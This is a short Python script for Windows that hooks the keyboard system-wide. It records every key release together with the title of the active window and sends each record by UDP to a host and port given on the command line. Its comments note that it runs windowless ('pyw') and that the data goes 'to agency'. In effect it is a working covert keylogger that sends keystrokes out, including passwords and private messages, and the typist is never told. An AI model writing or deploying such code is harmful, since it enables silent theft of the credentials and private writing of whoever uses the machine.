import os
import socket
import sys
import win32gui
import pyHook
import pickle
import pythoncom
import httplib
import time

from win32gui import GetWindowText, GetForegroundWindow
# from bottle import run, post, request, response
from classes import UDP


# pId = os.getpid()

# LVM_DELETEITEM = 4104
# win32gui.SendMessage(listview, LVM_DELETEITEM, pId, 0)
UDPAddr = sys.argv[1]
UDPPort = int(sys.argv[2])
debug = False

def onKeyboardEvent(event):
    # no use printing in pyw
    if debug:
        print('MessageName:', event.MessageName)
        print('Message:', event.Message)
        print('Time:', event.Time)
        print('Window:', event.Window)
        print('WindowName:', event.WindowName)
        print('Ascii:', event.Ascii, chr(event.Ascii))
        print('Key:', event.Key)
        print('KeyID:', event.KeyID)
        print('ScanCode:', event.ScanCode)
        print('Extended:', event.Extended)
        print('Injected:', event.Injected)
        print('Alt', event.Alt)
        print('Transition', event.Transition)
        print('---')

    evt = {'Window': event.Window,
           'WindowName': event.WindowName,
           'Key': event.Key
           }

    # SEND sendStr TO AGENCY
    sendStr = pickle.dumps(evt)

    # c.request('POST', '/process', sendStr)
    # doc = c.getresponse().read()
    # UDP.send(sock, UDPAddr, UDPPort, sendStr)
    sock.sendto(sendStr, (UDPAddr, UDPPort))

    # return True to pass the event to other handlers
    return True


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# sock.connect('localhost')

# sock.bind(('localhost', 41331))

# c = httplib.HTTPConnection('localhost', 41331)

# create a hook manager
hm = pyHook.HookManager()

# watch for all mouse events
# hm.KeyDown = onKeyboardEvent
# hm.KeyAll = onKeyboardEvent
hm.KeyUp = onKeyboardEvent

# set the hook
hm.HookKeyboard()

# start listening
pythoncom.PumpMessages()



